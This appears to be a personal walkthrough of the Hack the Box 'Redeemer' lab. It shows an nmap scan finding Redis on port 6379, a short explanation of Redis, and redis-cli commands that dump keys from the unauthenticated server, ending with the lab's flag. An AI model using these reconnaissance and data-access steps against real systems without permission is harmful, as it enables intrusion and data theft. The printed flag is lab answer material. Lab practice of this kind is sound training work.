Hack the Box
Starting Pont
Redeemer

10.129.161.86

sudo nmap -sV -sC -oA nmap/fawn 10.129.161.86

$ sudo nmap -vv -p T:1009-9999 -sV -Pn 10.129.161.86                                                             130 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93SVN ( https://nmap.org ) at 2023-06-17 19:01 EDT
NSE: Loaded 46 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 19:01
Completed Parallel DNS resolution of 1 host. at 19:01, 0.24s elapsed
Initiating SYN Stealth Scan at 19:01
Scanning 10.129.161.86 [8991 ports]
Discovered open port 6379/tcp on 10.129.161.86


Scanned at 2023-06-17 19:01:43 EDT for 83s
Not shown: 8990 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
6379/tcp open  redis   syn-ack ttl 63 Redis key-value store

Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.73 seconds
           Raw packets sent: 10206 (449.064KB) | Rcvd: 9960 (398.404KB)


What is Redis?
Redis (REmote DIctionary Server) is an open-source advanced NoSQL key-value data store used as a
database, cache, and message broker. The data is stored in a dictionary format having key-value pairs. It is
typically used for short term storage of data that needs fast retrieval. Redis does backup data to hard drives
to provide consistency


redis-cli -h 10.129.161.86

10.129.161.86:6379> info

10.129.161.86:6379> select 0

10.129.161.86:6379> keys *

10.129.161.86:6379> get flag
03e1d2b376c37ab3f5319922053953eb
